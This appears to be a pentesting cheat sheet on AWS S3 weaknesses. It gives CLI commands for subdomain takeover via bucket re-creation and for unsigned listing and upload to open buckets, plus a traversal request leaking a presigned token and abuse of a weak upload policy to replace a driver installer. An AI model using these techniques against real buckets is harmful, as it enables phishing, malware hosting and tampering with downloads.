# AWS

## S3 Buckets

### Subdomain Takeover

> Take control of a domain that was previously associated with a deprovisoned AWS resource is also known as a Subdomain Takover vulnerability 

##### Crear bucket

* aws s3 mb s3://example.domain.com
* aws s3api create-bucket --bucket example.domain.com --region eu-west-2 --create-bucket-configuration LocationConstraint=eu-west-2

##### Eliminar bucket

* aws s3 rb s3://example.domain.com --force

##### Configure bucket

* aws s3api put-bucket-policy --bucket example.domain.com --policy file://policy.json

##### Upload to bucket

* aws s3 sync ./static/ s3://example.domain.com
* aws s3 cp poc.html s3://example.domain.com

##### Enable public access

* aws s3 website s3://assets.cloudbilling.net/ --index-document index.html --error-document index.html

#### Gravity

* Hosting Phishing websites
* Hosting Malware
* Bypassing CSP policies
* Stealing Cookie's
* Man-in-the-browser attacks

## Public Read Bucket

A bucket is considered **public** if any user can list the contents of the S3 bucket, and **private** if the bucket's contents can only be listed or written by certain S3 users.

#### Tool

```bash
user@DESKTOP-6F28SID:~$pip install s3recon
user@DESKTOP-6F28SID:~$s3recon "word-list.txt" -o "results.json" --public
- PRIVATE https://s3.us-west-2.amazonaws.com/roblox-test
- PRIVATE https://s3.us-west-2.amazonaws.com/roblox
- PUBLIC https://s3.us-west-2.amazonaws.com/example-test
```

#### Manual
```bash
user@DESKTOP-6F28SID:~$aws s3 ls s3://domain --no-sign-request
An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
```

## Public Upload Bucket

#### Manual
```bash
user@DESKTOP-6F28SID:~$aws s3 cp poc.html s3://domain --no-sign-request
load to s3://
```

## S3 Directory traversal

```http
GET /get-image/ HTTP/1.1
HOST: example-domain.eu-west-2.amazonaws.com

{"image": "../../"}

Response

{
https://example-domain.s3.eu-west-2.amazonaws.com/?X-Amz-Security-Token=dIQodJb3JpZad2X2VjEG4aCWV1LXdlc3QtMiJGMEQCIA%2FPVoPn7hBH9Y65nGfvbqRDlh9gw21MMSzwoZlPiA9qAiA9WRCjo3v0lMDfREssIMDz4k6RnAHuKLrVHt9r32HZlyrlAQim%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDM5MjsYxNTkwMTQyMiIMrXDPzyr7Q%2F7YAQaOKrkBFVlm5VPjyJQ6V9BalmtLIgCWYtbzsRv%2FlMdYU5jzqq9CZjnkzNk9gXHP%2FwtMafwerFnMBn1E%2Fz6hK9YCJacm8SESCtB%2BCSM8dshzGF8mGyMb1vxd9gxE7RikQT4zSIFLnbTNlXCOTEU6757fiSnIsCH%2B7hC1WcnlQRshH%2FULuM7DsPYhnedxeSaqmTk0Uwi%fas2asdVf2RNHePMFQtCDb0L5svPwjLGmbfHWeWjL0vdhSurGO4wq7DiggY64QG96vZcj6GUBVVjRXftMu7wjDH4DKEUpO%2BPuPEpzbVPCX1nDgEddMe%2B5YSNZvYLJIwvNMld00JtZ1FJZgGrOd0dAe%2FfC%2Ba4g3%2BGlieZA6%2BbLZ3UJ6GGlhJluO4LLczel4x4IeUhxnB7znJmkTCccul2PwkowHjABzSMcFd62yEirnWQVDogKlXNsjZllMoEKuGsLWb1D8uDoeuSVE89b06hSaBoNA%2Fzyu1kigVAGxstnW0Z8PD5FjmbfGnWMmaQEkIodyM1JS0uS8COK%2BInUlfFi2wTsyiMOXMqiqse90PhaPPM%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20310322T134547Z&X-Amz-SignedHeaders=host&X-Amz-Expires=900&X-Amz-Credential=ASIAVW2N3HDXM37QBLWS%2F210210322%2Feu-west-2%2Fs3%2Faws4_request&X-Amz-Signature=9a2849e891b0f2cr4155e5c381f71ac047977edb85a997ccbf85d04c34b0a6277
}
```

## Weak S3 POST Upload Policy

The page has upload drivers via S3 bucket, also you can upload a file and replace the drivers file. 

However, Bob notices a misconfiguration with this policy attribute. The attribute should be defined with the following syntax:

["starts-with", "$key", "user/user1/"]

Since the key property is set to empty "", Bob can upload to any directory location in the S3 bucket by specifying an arbitrary key path in the POST request!

Content-Disposition: form-data; name="key"

downloads/drivers/launcher-bin-v3.2.0.296.dmg

## Reference:
https://application.security/free/kontra-aws-clould-top-10
